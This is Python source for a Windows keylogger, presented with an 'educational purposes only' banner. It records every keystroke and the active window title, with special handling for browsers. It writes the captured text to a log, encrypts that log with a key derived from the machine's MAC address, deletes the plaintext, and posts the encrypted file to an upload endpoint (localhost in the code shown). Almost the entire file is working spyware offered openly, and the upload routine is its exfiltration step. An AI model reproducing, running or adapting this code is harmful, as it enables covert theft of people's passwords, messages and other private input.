from cryptography.fernet import Fernet
from pynput import keyboard
import uuid
from base64 import urlsafe_b64encode
import os
import requests
import time
import ctypes
from ctypes import wintypes
import win32gui
import win32con

# ASCII Art and Initialization
print("\033[32m" + r"""
    )               (          )     )             
 ( /(    (   (      )\      ( /(  ( /(    (   (    
 )\())  ))\  )\ )  ((_) (   )\()) )\())  ))\  )(   
((_)\  /((_)(()/(   _   )\ ((_)\ ((_)\  /((_)(()\  
| |(_)(_))   )(_)) | | ((_)| |(_)| |(_)(_))   ((_) 
| / / / -_) | || | | |/ _ \| / / | / / / -_) | '_| 
|_\_\ \___|  \_, | |_|\___/|_\_\ |_\_\ \___| |_|   
             |__/                                  
                                                  @uki
GitHub: https://github.com/ukihunter

WARNING: This is for educational purposes only!
""" + "\033[0m")

# Key Generation
def generate_machine_key():
    mac_address = uuid.getnode()
    mac_str = str(mac_address).encode()
    padded = mac_str.ljust(32, b' ')
    return urlsafe_b64encode(padded)

key = generate_machine_key()
cipher = Fernet(key)
print(f"Encryption Key: {key.decode()}")

# Keylogger Configuration
log_file = "key_log.txt"
last_action_time = time.time()
flush_interval = 5  # Seconds
buffer = []
current_window = None

# Windows API Setup
user32 = ctypes.WinDLL('user32', use_last_error=True)
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk", wintypes.WORD),
        ("wScan", wintypes.WORD),
        ("dwFlags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p)  # Changed from ULONG_PTR to c_void_p
    ]

class INPUT(ctypes.Structure):
    class _INPUT(ctypes.Union):
        _fields_ = [("ki", KEYBDINPUT)]
    _anonymous_ = ("_input",)
    _fields_ = [
        ("type", wintypes.DWORD),
        ("_input", _INPUT)
    ]

def get_current_keyboard_layout():
    hwnd = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(hwnd, None)
    return user32.GetKeyboardLayout(thread_id)

def get_key_name(key, layout=None):
    keyboard_state = (ctypes.c_ubyte * 256)()
    user32.GetKeyboardState(keyboard_state)
    
    scan_code = user32.MapVirtualKeyExA(key.vk, 0, layout or get_current_keyboard_layout())
    buf = ctypes.create_string_buffer(8)
    rc = user32.ToAsciiEx(key.vk, scan_code, keyboard_state, buf, 0, layout or get_current_keyboard_layout())
    
    if rc == 1:
        return buf.value.decode('latin-1')
    return ''

def get_active_window_title():
    hwnd = user32.GetForegroundWindow()
    length = user32.GetWindowTextLengthW(hwnd)
    if length == 0:
        return None
    buffer = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buffer, length + 1)
    return buffer.value

# Key Handling
def handle_keypress(key, is_browser):
    global buffer, last_action_time
    
    try:
        char = get_key_name(key)
        if char:
            buffer.append(char)
        else:
            raise AttributeError
    except AttributeError:
        special_key = str(key).split('.')[-1].lower()
        key_map = {
            'space': ' ',
            'enter': '\n[ENTER]\n',
            'backspace': '[BACKSPACE]',
            'tab': '[TAB]',
            'shift': '[SHIFT]',
            'ctrl_l': '[CTRL]',
            'alt_l': '[ALT]',
            'cmd': '[WIN]',
            'esc': '[ESC]',
            'decimal': '.' if get_current_keyboard_layout() == 0x409 else ','
        }
        buffer.append(key_map.get(special_key, f'[{special_key.upper()}]'))
    
    # Browser-specific corrections
    if is_browser:
        if '[BACKSPACE]' in buffer[-1]:
            if len(buffer) > 1:
                buffer.pop(-2)
    
    last_action_time = time.time()

def flush_buffer():
    global buffer
    if buffer:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(''.join(buffer))
        buffer = []

# Main Listener
def on_press(key):
    global current_window
    try:
        current_window = get_active_window_title()
        is_browser = any(b in str(current_window).lower() for b in ['chrome', 'firefox', 'edge', 'opera'])
        
        handle_keypress(key, is_browser)
        
        # Auto-flush every 5 seconds or 100 characters
        if time.time() - last_action_time > flush_interval or len(buffer) > 100:
            flush_buffer()
            
    except Exception as e:
        print(f"Error: {e}")
        flush_buffer()

def on_release(key):
    if key == keyboard.Key.esc:
        flush_buffer()
        print("Stopping listener...")
        encrypt_file(log_file, cipher)
        return False

# File Handling
def encrypt_file(filename, cipher):
    try:
        with open(filename, "rb") as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(f"{filename}.encrypted", "wb") as f:
            f.write(encrypted)
        os.remove(filename)
        print(f"File encrypted: {filename}.encrypted")
    except Exception as e:
        print(f"Encryption error: {e}")

def upload_file(filename):
    try:
        with open(filename, "rb") as f:
            requests.post("http://localhost:3000/upload", files={"file": f})
        print("Upload successful")
    except Exception as e:
        print(f"Upload failed: {e}")

# Main Execution
if __name__ == "__main__":
    # Clean existing logs
    if os.path.exists(log_file):
        os.remove(log_file)
    
    print("Starting keylogger... (Press ESC to stop)")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    # Optional: Upload after encryption
    encrypted_file = f"{log_file}.encrypted"
    if os.path.exists(encrypted_file):
        upload_file(encrypted_file)